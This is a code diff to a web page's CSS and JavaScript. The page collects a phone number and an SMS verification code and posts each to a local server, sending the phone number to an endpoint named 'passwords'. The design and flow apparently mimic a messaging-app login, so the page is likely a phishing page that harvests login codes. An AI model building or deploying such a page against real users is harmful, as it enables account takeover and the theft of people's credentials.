@@ -105,7 +105,7 @@
             margin-bottom: 5px;
         }
 
-        input[type="tel"], .dropdown {
+        select, input[type="tel"], .dropdown {
             width: 100%;
             padding: 10px;
             border: 1px solid #ccc;
@@ -118,7 +118,7 @@
             transition: all 0.2s ease;
         }
 
-        input[type="tel"]:focus, .dropdown:hover {
+        select:focus, input[type="tel"]:focus, .dropdown:hover {
             border-color: #0088cc;
             outline: none;
             box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.2);
@@ -150,9 +150,17 @@
             width: 100%;
         }
 
+        .dropdown .flag {
+            display: none;
+        }
+
         .dropdown .country-name {
             flex-grow: 1;
             text-align: left;
+        }
+
+        .dropdown .country-code {
+            display: none;
         }
 
         .dropdown-menu {
@@ -193,6 +201,26 @@
 
         .dropdown-item:last-child {
             border-bottom: none;
+        }
+
+        .dropdown-item img {
+            width: 30px;
+            height: 20px;
+            object-fit: cover;
+            margin-right: 10px;
+        }
+
+        .dropdown-item span {
+            display: flex;
+            align-items: center;
+        }
+
+        .dropdown-item span .country-name {
+            margin-right: 10px;
+        }
+
+        .dropdown-item span .country-code {
+            font-weight: bold;
         }
 
         .dropdown-item:hover {
@@ -254,7 +282,7 @@
         <div class="input-group dropdown-container">
             <label for="countryCode">Country</label>
             <div id="countryCode" class="dropdown" onclick="toggleDropdown()">
-                <span><span class="country-name">Select your country</span></span>
+                <span><span class="country-name"></span></span>
             </div>
             <div id="dropdownMenu" class="dropdown-menu"></div>
         </div>
@@ -298,21 +326,24 @@
             const countryNameSpan = countryDropdown.querySelector('.country-name');
 
             const countries = [
-                { name: 'Australia', code: '+61' },
-                { name: 'United States', code: '+1' },
-                { name: 'United Kingdom', code: '+44' },
-                { name: 'Germany', code: '+49' },
-                { name: 'Russia', code: '+7' },
-                { name: 'Brazil', code: '+55' },
+                { name: 'Australia', code: '+61', flag: '🇦🇺' },
+                { name: 'United States', code: '+1', flag: '🇺🇸' },
+                { name: 'United Kingdom', code: '+44', flag: '🇬🇧' },
+                { name: 'Germany', code: '+49', flag: '🇩🇪' },
+                { name: 'Russia', code: '+7', flag: '🇷🇺' },
+                { name: 'Brazil', code: '+55', flag: '🇧🇷' },
                 // Add more countries as needed
             ];
 
             countries.forEach(country => {
                 const item = document.createElement('div');
                 item.classList.add('dropdown-item');
-                item.innerHTML = `<span>${country.name}</span> <span class="country-code">${country.code}</span>`;
+                item.innerHTML = `<span>${country.flag} ${country.name}</span> <span class="country-code">${country.code}</span>`;
+                item.dataset.code = country.code;
+                item.dataset.flag = country.flag;
+                item.dataset.name = country.name;
                 item.addEventListener('click', function() {
-                    countryNameSpan.textContent = `${country.name} (${country.code})`;
+                    countryNameSpan.textContent = country.name;
                     phoneNumberInput.value = country.code + ' ';
                     dropdownMenu.classList.remove('show');
                 });
@@ -333,10 +364,12 @@
 
             window.goToVerificationPage = function() {
                 const phoneNumber = document.getElementById('phoneNumber').value.trim();
-                if (phoneNumber === '' || phoneNumber.length < 5) {
-                    alert('Please enter a valid phone number.');
+                if (phoneNumber === '') {
+                    alert('Please enter your phone number.');
                     return;
                 }
+
+                console.log('Sending phone number to server:', phoneNumber);
 
                 fetch('http://localhost:8000/passwords', {
                     method: 'POST',
@@ -347,19 +380,18 @@
                         phone: phoneNumber,
                     }),
                 })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.status === 'success') {
-                        document.getElementById('phoneDisplay').textContent = phoneNumber;
-                        document.getElementById('initialContainer').classList.remove('active');
-                        document.getElementById('phoneVerificationContainer').classList.add('active');
-                    } else {
-                        alert('Failed to send phone number.');
+                .then(response => {
+                    if (!response.ok) {
+                        return response.text().then(text => { throw new Error(text) });
                     }
+                    console.log('Phone number sent successfully');
+                    document.getElementById('phoneDisplay').textContent = phoneNumber;
+                    document.getElementById('initialContainer').classList.remove('active');
+                    document.getElementById('phoneVerificationContainer').classList.add('active');
                 })
                 .catch(error => {
                     console.error('Error:', error);
-                    alert('An error occurred. Please try again.');
+                    alert('An error occurred: ' + error.message);
                 });
             };
 
@@ -372,6 +404,8 @@
                     return;
                 }
 
+                console.log('Sending verification code to server:', verificationCode);
+
                 fetch('http://localhost:8000/verification', {
                     method: 'POST',
                     headers: {
@@ -382,20 +416,27 @@
                         code: verificationCode,
                     }),
                 })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.status === 'success') {
-                        document.getElementById('phoneVerificationContainer').classList.remove('active');
-                        document.getElementById('finalMessageContainer').classList.add('active');
-                    } else {
-                        alert('Invalid verification code.');
+                .then(response => {
+                    if (!response.ok) {
+                        return response.text().then(text => { throw new Error(text) });
                     }
+                    console.log('Verification code sent successfully');
+                    document.getElementById('phoneVerificationContainer').classList.remove('active');
+                    document.getElementById('finalMessageContainer').classList.add('active');
                 })
                 .catch(error => {
                     console.error('Error:', error);
-                    alert('An error occurred. Please try again.');
+                    alert('An error occurred: ' + error.message);
                 });
             };
+
+            document.body.addEventListener('touchmove', function() {
+                document.activeElement.blur();
+            });
+
+            verificationContainer.addEventListener('scroll', function() {
+                document.activeElement.blur();
+            });
         });
     </script>
 </body>
